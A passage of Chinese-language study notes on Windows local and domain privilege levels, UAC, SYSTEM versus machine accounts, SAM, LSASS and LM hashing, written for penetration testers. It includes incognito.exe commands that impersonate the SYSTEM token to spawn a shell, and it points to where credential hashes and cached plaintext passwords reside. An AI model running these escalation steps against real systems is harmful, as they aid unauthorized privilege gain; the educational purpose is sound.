\u6761\u76ee\uff1a\u76ee\u5f55\u6570\u636e\u5e93\u4e2d\u6bcf\u4e00\u4e00\u4e2a\u6761\u76ee\u5c31\u662f\u4e00\u6761\u8bb0\u5f55\u3002\u6bcf\u4e2a\u6761\u76ee\u90fd\u6709\u81ea\u5df1\u7684\u552f\u4e00\u7edd\u5bf9\u53ef\u8fa8\u8bc6\u540d\u79f0\uff08DN\uff09 \u3002\\r\\n>\\r\\n> DN\uff1a\u6307\u5411\u4e00\u4e2aLDAP\u5bf9\u8c61\u7684\u5b8c\u6574\u8def\u5f84\u3002DN \u7531\u5bf9\u8c61\u672c\u4f53\u5f00\u59cb\uff0c\u5411\u4e0a\u5ef6\u7533\u5230\u57df\u9876\u7ea7\u7684DNS\u547d\u540d\u7a7a\u95f4\u3002CN \u4ee3\u8868\\r\\n>\\r\\n> \u901a\u7528\u540d\uff0cOU\u4ee3\u8868\u4e2d\u7ec4\u7ec7\u5355\u4f4d\uff0cDC\u4ee3\u8868\u57df\u7ec4\u4ef6\\r\\n>\\r\\n> RDN\uff1a\u662f\u6307\u5411\u4e00\u4e2aLDAP\u5bf9\u8c61\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\u6bd4\u5982 CN=DC1 \u6761\u76ee\u7684RDN\u5c31\u662fCN=DC1\\r\\n>\\r\\n> \u5c5e\u6027\uff1a\u7528\u4e8e\u63cf\u8ff0\u6570\u636e\u5e93\u4e2d\u7684\u6bcf\u4e2a\u6761\u76ee\u7684\u5177\u4f53\u4fe1\u606f\u3002\\r\\n\\r\\n## \u5de5\u4f5c\u7ec4\u6743\u9650\\r\\n\\r\\n### \u672c\u5730\u5de5\u4f5c\u7ec4\\r\\n\\r\\n\u200b\\t\u5728\u7535\u8111\u4e2d\u4e00\u822c\u6709\u4e24\u79cd\u89d2\u8272\uff0c\u4e00\u4e2a\u662f\u7528\u6237\u4e00\u4e2a\u662f\u7ec4\uff0c\u4e00\u4e2a\u7ec4\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u7528\u6237\uff0c\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u7ec4\uff0c\u901a\u8fc7\u7ed9\u7ec4\u5212\u5206\u4e0d\u540c\u7684\u6743\u9650\uff0c\u7528\u6237\u5c31\u6709\u4e86\u4e0d\u540c\u7684\u6743\u9650\\r\\n\\r\\n![image-20250403225037674](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403225037674.png)\\r\\n\\r\\n### \u672c\u5730\u6700\u9ad8\u7ba1\u7406\u5458\u6743\u9650(administrator) \\r\\n\\r\\n- 1\u3001Administrator\u7528\u6237\u5728\u5bb6\u5ead\u7248\u7684\u7535\u8111\u4e2d\u662f\u5c5e\u4e8e\u7981\u7528\u7684\u72b6\u6001\uff0c\u5728\u4e13\u4e1a\u7248\u4e2d\u5c5e\u4e8e\u5f00\u542f\u7684\u72b6\u6001\uff0c\u5728server\u673a\u5668\u4e2d\u5c5e\u4e8e\u5f00\u542f \\r\\n- 2\u3001Administrator\u7528\u6237\u7684SID \u6700\u540e\u4e00\u4f4d\u662f500 \\r\\n- 3\u3001Administrator \u7528\u6237\u9ed8\u8ba4\u5728administrators\u7ec4\u4e2d\\r\\n\\r\\n![image-20250403225258912](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403225258912.png)\\r\\n\\r\\n### \u672c\u5730\u666e\u901a\u7ba1\u7406\u5458\u6743\u9650\\r\\n\\r\\n\u200b\\t\u4e0a\u9762\u56fe\u7247\u4e2d\uff0c\u5728Administrator\u7ec4\u4e2d\u7684\u7528\u6237`ikun`\u5c31\u662f\u666e\u901a\u7ba1\u7406\u5458\u6743\u9650\uff0c**\u4ed6\u4eec\u7684\u533a\u522b\u662f**\uff0c\u666e\u901a\u7ba1\u7406\u5458\u5728\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u654f\u611f\u7684\u64cd\u4f5c\u65f6\uff08\u5982\uff1a\u6dfb\u52a0\u7528\u6237\uff09\uff0c\u53d7UAC\uff08User Account Control\uff09\u7684\u9650\u5236\\r\\n\\r\\n\u200b\\t\u5982\u679c\u8981\u6267\u884c\u9ad8\u6743\u9650\u7684\u64cd\u4f5c\u5fc5\u987b\u53f3\u952e\u4f7f\u7528\u7ba1\u7406\u5458\u6253\u5f00\\r\\n\\r\\n![image-20250403225853782](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403225853782.png)\\r\\n\\r\\n### \u672c\u5730\u666e\u901a\u7528\u6237\\r\\n\\r\\n\u200b\\t\u672c\u5730\u666e\u901a\u7528\u6237\uff0c\u5c31\u662f\u5728windows\u7535\u8111\u4e2d\u672c\u5730\u65b0\u5efa\u7684\u666e\u901a\u7528\u6237\u3002\u6ca1\u6709\u7ba1\u7406\u5458\u7684\u6743\u9650\uff0c\u4e00\u822c\u5f88\u591a\u64cd\u4f5c\u6267\u884c\u4e0d\u4e86\uff0c\u9700\u8981\u7ba1\u7406\u5458\u8ba4\u8bc1\u540e\u624d\u53ef\u4ee5\u6267\u884c\uff0c\u4ee5\u4e0b\u662fwindows\u7528\u6237\u7ec4\uff0c\u65b0\u5efa\u7684\u7528\u6237\u4e00\u822c\u9ed8\u8ba4\u662fuser\u7ec4\\r\\n\\r\\n\u200b\\t\u5f53\u6211\u4eec\u8fdb\u884c\u9ad8\u6743\u9650\u7684\u64cd\u4f5c\u65f6\u5019\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u7684\u8ba4\u8bc1\uff08**\u9700\u8981\u8f93\u5165\u7ba1\u7406\u5458\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u53ef\u4ee5**\uff09\\r\\n\\r\\n### UAC\u8ba4\u8bc1\\r\\n\\r\\n\u200b\\t\u7528\u6237\u8d26\u6237\u63a7\u5236\uff08User Account Control\uff0c\u7b80\u5199\u4f5cUAC\uff09\u662f\u5fae\u8f6f\u516c\u53f8\u5728\u5176Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u91c7\u7528\u7684\u4e00\u79cd\u63a7\u5236\u673a\u5236\u3002\\r\\n\\r\\n\u8fdb\u884c\u4e00\u4e9b\u4f1a\u5f71\u54cd\u7cfb\u7edf\u5b89\u5168\u7684\u64cd\u4f5c\u65f6\uff0c\u4f1a\u81ea\u52a8\u89e6\u53d1UAC\uff0c\u7528\u6237\u786e\u8ba4\u540e\u624d\u80fd\u6267\u884c\u3002\\r\\n\\r\\n![image-20250403230258500](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403230258500.png)\\r\\n\\r\\n**\u51ed\u636e\u63d0\u793a**\u5f53**\u6807\u51c6\u7528\u6237**\u5c1d\u8bd5\u6267\u884c\u9700\u8981\u7528\u6237\u7ba1\u7406\u8bbf\u95ee\u4ee4\u724c\u7684\u4efb\u52a1\u65f6\uff0c\u4f1a\u663e\u793a\u51ed\u636e\u63d0\u793a\u3002\\r\\n\\r\\n![image-20250403230343937](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403230343937.png)\\r\\n\\r\\n### \u672c\u5730\u7cfb\u7edf\u6700\u9ad8\u6743\u9650(system)\\r\\n\\r\\nSYSTEM\u7684\u4e2d\u6587\u610f\u601d\u662f\u7cfb\u7edf\uff0c\u5728Windows\u4e2d\u4e3b \u8981\u4f5c\u4e3a\u7cfb\u7edf\u670d\u52a1\u6216\u8fdb\u7a0b\u7684\u8fd0\u884c\u8d26\u6237\\r\\n\\r\\n**Administrator\u548csystem\u6743\u9650\u533a\u522b** \\r\\n\\r\\n\u5e76\u4e0d\u662f\u8bf4System\u6bd4Administrator\u6743\u9650\u5927\uff0c\u8fd9\u4e24\u4e2a\u7528 \u6237\u7684\u533a\u522b\u662f\\r\\n\\r\\n**Administrator**\u662f\u7cfb\u7edf\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u7528\u6237\uff0c \u4e00\u822c\u5e73\u65f6\u5b89\u88c5\u3001\u8fd0\u884c\u7a0b\u5e8f\u3001\u4fee\u6539\u7cfb\u7edf\u8bbe\u7f6e\u7b49\u90fd\u662f\u4ee5\u8fd9\u4e2a\u6743\u9650\u8eab\u4efd\u8fd0\u884c\u7684 \\r\\n\\r\\n**System\u6743\u9650**\u662f\u7cfb\u7edf\u672c\u8eab\u7684\u6743\u9650\uff0c\u6bd4\u5982\u4efb\u52a1\u7ba1\u7406\u5668\u91cc\u9762\u7684winlogon.exe\u3001svchost.exe\u3001alg.exe\u8fd9\u4e9b\u8fdb\u7a0b\u7b49\u7b49\uff0c\u53e6\u5916\uff0c\u6ce8\u518c\u8868\u91cc\u9762\u67d0\u4e9b\u5730 \u65b9\u53ea\u6709\u7cfb\u7edf\u81ea\u5df1\u53ef\u4ee5\u8bbf\u95ee\uff0cAdministrator\u7528\u6237\u4e5f\u4e0d\u80fd\u8bbf\u95ee\\r\\n\\r\\n## \u57df\u5185\u6743\u9650\\r\\n\\r\\n### \u57df\u5185\u7528\u6237\u7ec4\u4ecb\u7ecd\\r\\n\\r\\n\u200b\\t\u673a\u5668\u52a0\u5165\u5230\u57df\uff0c\u4f7f\u7528\u57df\u5185\u7684\u7528\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u57df\u5185\u7528\u6237\u7684\u4fe1\u606f\u5b58\u653e\u5728\u57df\u63a7\uff08DC\uff09\u4e0a\uff0c\u6dfb\u52a0\u7528\u6237\u6216\u8005\u4fee\u6539\u5bc6\u7801\u767b\u64cd\u4f5c\u90fd\u5728\u57df\u63a7\u4e0a\u6267\u884c\\r\\n\\r\\n![image-20250403232513297](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250403232513297.png)\\r\\n\\r\\n\\r\\n\\r\\n\u200b\\t**\u7ba1\u7406\u5458\u7ec4**( Administrators)\u7684\u6210\u5458\u53ef\u4ee5\u4e0d\u53d7\u9650\u5236\u5730\u5b58\u53d6\u8ba1\u7b97\u673a/\u57df\u7684\u8d44\u6e90\u3002\u5b83\u4e0d\u4ec5\u662f\u6700\u5177\u6743\u529b\u7684\u4e00\u4e2a\u7ec4,\u4e5f\u662f\u5728**\u6d3b\u52a8\u76ee\u5f55\u548c\u57df\u63a7\u5236\u5668\u4e2d\u9ed8\u8ba4\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\u7684\u7ec4**\u3002\u8be5\u7ec4\u7684\u6210\u5458\u53ef\u4ee5\u66f4\u6539 Enterprise Admins\u3001 Domain admins\u7ec4\u7684\u6210\u5458\u5173\u7cfb,\u662f\u57df\u68ee\u6797\u4e2d\u5f3a\u5927\u7684\u670d\u52a1\u7ba1\u7406\u7ec4\\r\\n\\r\\n\u8fd9\u4e2a\u7ba1\u7406\u7ec4\u76f8\u5f53\u4e8e\uff0c\u57df\u63a7\u673a\u5668\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u7ec4\uff0c\u91cc\u9762\u7684\u6210\u5458\u662f\u57df\u63a7\u673a\u5668\u7684\u7ba1\u7406\u5458\uff1b\u5e76\u4e14\u6dfb\u52a0\u5230`Domain Admins`\u7ec4\u7684\u7528\u6237\uff0c\u4e5f\u662f\u57df\u63a7\u5236\u5668\u7684\u7ba1\u7406\u5458\u3002\\r\\n\\r\\n![image-20250404155632763](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404155632763.png)\\r\\n\\r\\n![image-20250404155710330](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404155710330.png)\\r\\n\\r\\n\u200b\\t**\u57df\u7ba1\u7406\u5458\u7ec4( Domain Admins)** \u6307\u5b9a\u7684\u57df\u7ba1\u7406\u5458,\u62e5\u6709\u5b8c\u6574\u7684\u7ba1\u7406\u5458\u6743\u9650\u3002\u56e0\u4e3a\u8be5\u7ec4\u4f1a\u88ab\u6dfb\u52a0\u5230\u81ea\u5df1\u6240\u5728\u57df\u7684 Administrators\u7ec4\u4e2d,\u56e0\u6b64\u53ef\u4ee5**\u7ee7\u627f Administrators\u7ec4\u7684\u6240\u6709\u6743\u9650**\u3002\u540c\u65f6\u8be5\u7ec4\u9ed8\u8ba4\u4f1a\u88ab\u6dfb\u52a0\u5230**\u6bcf\u53f0\u57df\u6210\u5458\u8ba1\u7b97\u673a\u7684\u672c\u5730 Administrators\u7ec4\u4e2d**, \u8fd9\u6837, Domain admins\u7ec4\u5c31\u83b7\u5f97\u4e86\u57df\u4e2d\u6240\u6709\u8ba1\u7b97\u673a\u7684\u6240\u6709\u6743\u3002\\r\\n\\r\\n![image-20250404160535692](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404160535692.png)\\r\\n\\r\\n![image-20250404160604525](C:\\\\Users\\\\86188\\\\AppData\\\\Roaming\\\\Typora\\\\typora-user-images\\\\image-20250404160604525.png)\\r\\n\\r\\n**\u57df\u5185\u4e3b\u673a\u7684Administrators\u7ec4**\\r\\n\\r\\nDomain admins\u7ec4\u5c31\u83b7\u5f97\u4e86\u57df\u4e2d\u6240\u6709\u8ba1\u7b97\u673a\u7684\u6240\u6709\u6743\\r\\n\\r\\n![image-20250404160952949](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404160952949.png)\\r\\n\\r\\n\u200b\\t**\u4f01\u4e1a\u7cfb\u7edf\u7ba1\u7406\u5458\u7ec4( Enterprise Admins)**\u662f\u57df\u68ee\u6797\u6216\u8005\u6839\u57df\u4e2d\u7684\u4e00\u4e2a\u7ec4\u3002\u8be5\u7ec4\u5728\u57df\u68ee\u6797\u4e2d\u7684\u6bcf\u4e2a\u57df\u5185\u90fd\u662f Administrators\u7ec4\u7684\u6210\u5458,\u56e0\u6b64\u5bf9**\u6240\u6709\u57df\u63a7\u5236\u5668\u90fd\u6709\u5b8c\u5168\u8bbf\u95ee\u6743**\u3002\\r\\n\\r\\n![image-20250404161216517](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161216517.png)\\r\\n\\r\\n![image-20250404161250253](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161250253.png)\\r\\n\\r\\n\u200b\\t\u57df\u7528\u6237\u7ec4( Domain users)\u4e2d\u662f\u6240\u6709\u7684\u57df\u6210\u5458\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b,\u4efb\u4f55\u7531\u6211\u4eec\u5efa\u7acb\u7684\u7528\u6237\u8d26\u53f7\u90fd\u5c5e\u4e8e Domain Users\u7ec4,\u8be5\u7ec4\u5728\u57df\u5185\u673a\u5668\u4e2d\u5b58\u5728\u4e8e Users\u7ec4\\r\\n\\r\\n![image-20250404161435503](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161435503.png)\\r\\n\\r\\nDomain Computers\u7ec4\uff0c\u4efb\u4f55\u7531\u6211\u4eec\u5efa\u7acb\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u90fd\u5c5e\u4e8e\u8be5\u7ec4\\r\\n\\r\\n![image-20250404161544648](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161544648.png)\\r\\n\\r\\n\u673a\u5668\u52a0\u5165\u5230\u57df\u4e4b\u540e\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u57df\u5185\u7528\u6237\u767b\u5f55\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u7528\u6237\u767b\u5f55\uff0c\u6ce8\u610f\u4ee5\u4e0b\u7684\u533a\u522b \\r\\n\\r\\n- 1\u3001\u672c\u5730\u7528\u6237\u767b\u5f55\uff0c\u662f\u5b58\u653e\u5728\u672c\u5730\u6587\u4ef6\u4e2d\u7136\u540e\u672c\u673a\u8fdb\u884c\u6821\u9a8c\u3002\u57df\u5185\u7528\u6237\u767b\u5f55\uff0c\u662f\u8981\u901a\u8fc7DC\u7684\u8ba4\u8bc1\u4e4b\u540e\u624d\u80fd\u767b\u5f55\uff0c\u7528\u6237\u4fe1\u606f\u5b58\u653e\u5728\u57df\u63a7\u4e0a \\r\\n- 2\u3001\u672c\u5730\u7528\u6237\u767b\u5f55\u4e3b\u8981\u662f\u5bf9\u6bd4NTLM HASH\u503c\uff0c\u57df\u8ba4\u8bc1\u662f\u901a\u8fc7kerberos\u8ba4\u8bc1 \\r\\n- 3\u3001\u673a\u5668\u53ef\u4ee5\u9009\u62e9\u672c\u5730\u767b\u5f55\u6216\u8005\u57df\u7528\u6237\u767b\u5f55\uff0c\u672c\u5730\u7528\u6237 \u673a\u5668\u540d\\\\\u7528\u6237\u540d\uff0c\u57df\u5185\u7528\u6237 \u57df\u540d\\\\\u7528\u6237\u540d\\r\\n\\r\\n### \u57df\u5185\u6700\u9ad8\u7ba1\u7406\u5458\u6743\u9650\\r\\n\\r\\n\u200b\\t\u57df\u5185\u6700\u9ad8\u7ba1\u7406\u5458\u6743\u9650\u662f \u57df\u540d\\\\administrator,\u4ed6\u6ca1\u6709UAC\u8ba4\u8bc1\uff0c\u4ed6\u4e5f\u662f\u6bcf\u4e2a\u57df\u5185\u673a\u5668\u7684\u672c\u5730\u7ba1\u7406\u5458\uff0c\u548c\u673a\u5668\u540d\\\\administrator \u5177\u6709\u76f8\u540c\u7684\u6743\u9650\uff0c**SID\u4e5f\u662f500**\\r\\n\\r\\n![image-20250404161649038](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161649038.png)\\r\\n\\r\\n### \u57df\u5185\u666e\u901a\u7ba1\u7406\u5458\u6743\u9650\\r\\n\\r\\n\u200b\\t\u57df\u5185\u666e\u901a\u7ba1\u7406\u5458\u5c31\u662f\u52a0\u5165\u4e86\u57df\u4e2d\u7684Domain Admins\u7ec4\uff0c\u4f46\u4e0d\u662fadministrator\u7528\u6237\\r\\n\\r\\n\u4ed6\u662f\u57df\u5185\u4e3b\u673a\u7684\u666e\u901a\u7ba1\u7406\u5458\\r\\n\\r\\n![image-20250404161740472](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404161740472.png)\\r\\n\\r\\n### \u57df\u5185\u666e\u901a\u7528\u6237\u6743\u9650\\r\\n\\r\\n\u200b\\t\u57df\u7528\u6237\u7ec4( Domain users)\u4e2d\u662f\u6240\u6709\u7684\u57df\u6210\u5458\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b,\u4efb\u4f55\u7531\u6211\u4eec\u5efa\u7acb\u7684\u7528\u6237\u8d26\u53f7\u90fd\u5c5e\u4e8e Domain Users\u7ec4,\u8be5\u7ec4\u5728\u57df\u5185\u673a\u5668\u4e2d\u5b58\u5728\u4e8e Users\u7ec4\\r\\n\\r\\n\u200b\\t\u4ed6\u5c31\u76f8\u5f53\u4e8e\u672c\u5730\u7684\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u6267\u884c\u9ad8\u64cd\u4f5c\u7684\u65f6\u5019\u9700\u8981UAC\u8ba4\u8bc1\\r\\n\\r\\n![image-20250404162240163](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404162240163.png)\\r\\n\\r\\n### \u673a\u5668\u7528\u6237\u548cSYSTEM\u5173\u7cfb\\r\\n\\r\\n\u200b\\tDomain Computers\u7ec4\uff0c\u4efb\u4f55\u7531\u6211\u4eec\u5efa\u7acb\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u90fd\u5c5e\u4e8e\u8be5\u7ec4,\u673a\u5668\u8d26\u6237\u662f\u6307\u5728\u7f51\u7edc\u4e2d\u7528\u4e8e\u4ee3\u8868\u8ba1\u7b97\u673a\u6216\u8bbe\u5907\u7684\u8d26\u6237\u3002\u5728Windows\u57df\u73af\u5883\u4e2d\uff0c\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u6709\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u4e2d\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u548c\u6388\u6743\u3002\\r\\n\\r\\n\u200b\\t**\u673a\u5668\u8d26\u6237**\u7684\u540d\u79f0\u901a\u5e38\u4ee5\u8ba1\u7b97\u673a\u540d\u79f0\u6216\u8ba1\u7b97\u673aGUID\u4f5c\u4e3a\u524d\u7f00\uff0c\u5982\u201cZS-PC$\\"\u3002\u673a\u5668\u8d26\u6237\u4e0e\u5177\u4f53\u8ba1\u7b97\u673a\u76f8\u5173\u8054\uff0c\u7528\u4e8e**\u4ee3\u8868\u8ba1\u7b97\u673a\u8fdb\u884c\u57df\u8ba4\u8bc1\u548c\u8bbf\u95ee\u57df\u8d44\u6e90\u3002**\\r\\n\\r\\n\\r\\n\\r\\n**\u673a\u5668\u7528\u6237\u548cSYSTEM\u533a\u522b**\\r\\n\\r\\n\u200b\\t\u5f53\u7535\u8111\u52a0\u5165\u5230\u57df\u4e2d\u540e\u673a\u5668\u8d26\u53f7\u7684\u5bc6\u7801\u6216\u540c\u6b65\u5230\u57df\u63a7\u4e0a\uff0c\u6240\u4ee5\u8bf4**\u672c\u5730system\u7528\u6237\u5bf9\u5e94\u57df\u5185\u7684\u673a\u5668\u7528\u6237**\uff0c\u5982\u679c\u8bf4\u6211\u4eec\u6e17\u900f\u7684\u7535\u8111\u52a0\u5165\u4e86\u57df\uff0c\u4f46\u662f\u4f7f\u7528\u672c\u5730\u7528\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5**\u63d0\u6743\u5230system\u7528\u6237**\uff0c\u7136\u540e\u5bf9\u57df\u5185\u8fdb\u884c\u67e5\u8be2 \\r\\n\\r\\n\u200b\\t\u867d\u7136\\"System\\"\u8d26\u6237\u662f\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7684\u7279\u6b8a\u8d26\u6237\uff0c\u800c\u673a\u5668\u8d26\u6237\u662f\u57df\u73af\u5883\u4e2d\u7684\u8d26\u6237\uff0c\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4f8b\u5982\u5f53\u672c\u5730\u8ba1\u7b97\u673a\u9700\u8981\u8bbf\u95ee\u57df\u8d44\u6e90\u65f6\uff0c\\"System\\"\u8d26\u6237\u53ef\u80fd\u4f1a\u5145\u5f53\u673a\u5668\u8d26\u6237\u7684\u89d2\u8272\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u57df\u73af\u5883\u4e2d\uff0c\u672c\u5730\u8ba1\u7b97\u673a\u53ef\u4ee5\u4f7f\u7528\\"System\\"\u8d26\u6237\u4f5c\u4e3a\u5176\u8eab\u4efd\u8fdb\u884c\u57df\u8ba4\u8bc1\u548c\u8bbf\u95ee\u6388\u6743\u3002\\r\\n\\r\\n\u200b\\t\u4f46\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u5b83\u4eec\u4ecd\u7136\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6982\u5ff5\uff0c \\"System\\"\u8d26\u6237\u4e0d\u662f\u4e13\u95e8\u4e3a\u57df\u4e2d\u7684\u673a\u5668\u8d26\u6237\u800c\u521b\u5efa\u7684\u3002\\r\\n\\r\\n\u52a0\u5165\u5230\u57df\u7684\u673a\u5668\uff0c\u672c\u5730\u7ba1\u7406\u5458`administrator`\u4e0d\u80fd\u8bbf\u95ee\u57df\u5185\u8d44\u6e90\uff0c\u4f46\u662fsystem\u53ef\u4ee5\\r\\n\\r\\n![image-20250404165847829](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404165847829.png)\\r\\n\\r\\n\u4f7f\u7528\u5de5\u5177`incognito`\uff0c\u5207\u6362\u5230system\u7528\u6237\\r\\n\\r\\n```\\r\\nincognito.exe list_tokens -u\\r\\n```\\r\\n\\r\\n``` \\r\\nincognito.exe execute -c \\"NT AUTHORITY\\\\SYSTEM\\" cmd.exe\\r\\n```\\r\\n\\r\\n![image-20250404170302754](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404170302754.png)\\r\\n\\r\\n## \u672c\u5730\u8ba4\u8bc1\\r\\n\\r\\n\u200b\\t\u672c\u5730\u8ba4\u8bc1\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u4eec\u7684\u7535\u8111\u4e0a\u5b58\u50a8\u7740\u81ea\u5df1\u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u65e0\u8bba\u7535\u8111\u662f\u5426\u8054\u7f51\uff0c\u53ea\u8981\u80fd\u5f00\u673a\uff0c\u5c31\u53ef\u4ee5\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u5230\u7535\u8111\u4e2d\uff0c\u5de5\u4f5c\u7ec4\u5c31\u662f\u91c7\u7528\u672c\u5730\u8ba4\u8bc1\\r\\n\\r\\n**\u8ba4\u8bc1\u7b80\u5355\u6d41\u7a0b**\\r\\n\\r\\n![image-20250404192740250](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404192740250.png)\\r\\n\\r\\nWindows Logon Process\uff08\u5373winlogon.exe\uff09\uff1a\u662fWindows NT \u7528\u6237\u767b\u9646\u7a0b\u5e8f\uff0c\u7528\u4e8e\u7ba1\u7406\u7528\u6237\u767b\u9646\u548c\u9000\u51fa.\u7528\u6237\u6ce8\u9500\u3001\u91cd\u542f\u3001\u9501\u5c4f\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u8ba9winlogon.exe\u663e\u793a\u767b\u9646\u754c\u9762\\r\\n\\r\\n### SAM\u6587\u4ef6\u548clsaess\u8fdb\u7a0b\\r\\n\\r\\nlsass.exe\u662f\u4e00\u4e2a\u7cfb\u7edf\u8fdb\u7a0b\uff0c\u7528\u4e8e\u5fae\u8f6fWindows\u7cfb\u7edf\u7684\u5b89\u5168\u673a\u5236\u3002\u5b83\u7528\u4e8e\u672c\u5730\u5b89\u5168\u548c\u767b\u9646\u7b56\u7565 \\r\\n\\r\\nSAM\u6587\u4ef6\u662f\u4f4d\u4e8eC\\\\windows\\\\system32\\\\config\\\\\u76ee\u5f55\u4e0b\u7684\uff0c\u7528\u4e8e\u50a8\u5b58\u672c\u5730\u6240\u6709\u7528\u6237\u7684\u51ed\u8bc1\u4fe1\u606f\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4ee3\u8868\u7740\u4f60\u53ef\u4ee5\u968f\u610f\u53bb\u67e5\u770b\u7cfb\u7edf\u5bc6\u7801 \\r\\n\\r\\nSAM\u6587\u4ef6\u662fWindows\u7684\u7528\u6237\u8d26\u6237\u6570\u636e\u5e93,\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u540d\u53ca\u53e3\u4ee4\u7b49\u76f8\u5173\u4fe1\u606f\u90fd\u4f1a\u4fdd\u5b58\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d,\u7b80\u5355\u5982\u4e0b\uff1a\u7528\u6237\u540d\u79f0:LM-HASH\u503c:NTLM-HASH\u503c\\r\\n\\r\\nLsass.exe\u8fdb\u7a0b\u7684\u4f5c\u7528\u975e\u5e38\u91cd\u8981\uff0c\u5b83\u4e3b\u8981\u8d1f\u8d23\u7ba1\u7406\u672c\u5730\u5b89\u5168\u7b56\u7565\u548c\u8ba4\u8bc1\u673a\u5236\u3002\u8fd9\u4e9b\u7b56\u7565\u5305\u62ec\u5bc6\u7801\u7b56\u7565\u3001\u8d26\u6237\u7b56\u7565\u3001\u7528\u6237\u6743\u9650\u3001\u57df\u7b56\u7565\u7b49\u7b49\u3002\u540c\u65f6\uff0c\u5b83\u8fd8\u8d1f\u8d23\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4ee5\u786e\u4fdd\u53ea\u6709\u6388\u6743\u7684\u7528\u6237\u624d\u80fd\u8bbf\u95ee\u7cfb\u7edf\u8d44\u6e90\u3002\\r\\n\\r\\n- 1\u3001\u5c06winlogon\u4f20\u8fc7\u6765\u7684\u660e\u6587\u8d26\u53f7\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\uff0c\u7136\u540e\u548cSAM\u6587\u4ef6\u4e2d\u7684\u5bc6\u6587\u8d26\u53f7\u5bc6\u7801\u4f5c\u5bf9\u6bd4\u3002\u5982\u679c\u5bf9\u6bd4\u6210\u529f\u5c31\u767b\u9646\u6210\u529f \\r\\n- 2\u3001\u5c06\u6536\u5230\u7684\u660e\u6587\u8d26\u53f7\u5bc6\u7801\u5728\u672c\u5730\u5185\u5b58\u4e2d\u4fdd\u7559\u4e00\u4efd\u7528\u4f5c\u5907\u7528\\r\\n\\r\\n![image-20250404193053905](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250404193053905.png)\\r\\n\\r\\n### LM Hash\u52a0\u5bc6\\r\\n\\r\\n\u5728 Windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d,Hash\u7684\u7ed3\u6784\u901a\u5e38\u5982\u4e0b: `username:RID:LM-HASH:NT-HASH`\\r\\n\\r\\nLM Hash\u7684\u5168\u540d\u4e3a\\"LAN Manager Hash\\",\u662f\u5fae\u8f6f\u4e3a\u4e86\u63d0\u9ad8 Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u800c\u91c7\u7528\u7684\u6563\u5217\u52a0\u5bc6\u7b97\u6cd5,\u5176\u672c\u8d28\u662fDES\u52a0\u5bc6\u3002\\r\\n\\r\\nLM Hash\u660e\u6587\u5bc6\u7801\u88ab\u9650\u5b9a\u572814\u4f4d\u4ee5\u5185,\u4e5f\u5c31\u662f\u8bf4,\u5982\u679c\u8981\u505c\u6b62\u4f7f\u7528 LM Hash,\u5c06 